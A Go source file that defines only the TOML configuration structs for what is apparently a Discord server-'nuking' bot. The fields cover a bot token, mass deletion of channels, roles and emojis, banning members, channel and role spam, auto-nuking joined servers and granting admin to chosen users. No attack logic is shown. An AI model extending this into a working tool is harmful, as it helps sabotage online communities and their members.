package main

type NukeConfig struct {
	GuildID       string        `toml:"guildID"`
	Token         string        `toml:"token"`
	FeatureConfig FeatureConfig `toml:"feature_config"`
}
type FeatureConfig struct {
	AfterChannel   AfterChannelConfig  `toml:"after_channels"`
	MemberRemoval  MemberRemovalConfig `toml:"member_removal"`
	AutoNuke       AutoNukeConfig      `toml:"auto_nuke"`
	RoleSpam       RoleSpamConfig      `toml:"role_spam"`
	Status         StatusConfig        `toml:"status"`
	DeleteEmojis   bool                `toml:"delete_emojis"`
	DeleteRoles    bool                `toml:"delete_roles"`
	DeleteChannels bool                `toml:"delete_channels"`
	AutoAdmin      []string            `toml:"auto_admin"`
}
type MemberRemovalConfig struct {
	Enabled    bool     `toml:"enabled"`
	BanMembers bool     `toml:"ban_members"`
	Exempt     []string `toml:"exempt"`
}
type AfterChannelConfig struct {
	Enabled            bool   `toml:"enabled"`
	Message            string `toml:"message"`
	MessageRepetitions int    `toml:"message_repetitions"`
	ChannelAmount      int    `toml:"channel_amount"`
	ChannelName        string `toml:"channel_name"`
}
type StatusConfig struct {
	Enabled      bool   `toml:"enabled"`
	ActivityName string `toml:"activity_name"`
}
type AutoNukeConfig struct {
	Enabled      bool     `toml:"enabled"`
	TargetOnly   []string `toml:"target_only"`
	ExemptGuilds []string `toml:"exempt_guilds"`
}
type RoleSpamConfig struct {
	Enabled    bool     `toml:"enabled"`
	RoleName   string   `toml:"role_name"`
	RoleNames  []string `toml:"role_names"`
	RoleColor  int      `toml:"role_color"`
	RoleAmount int      `toml:"role_amount"`
}
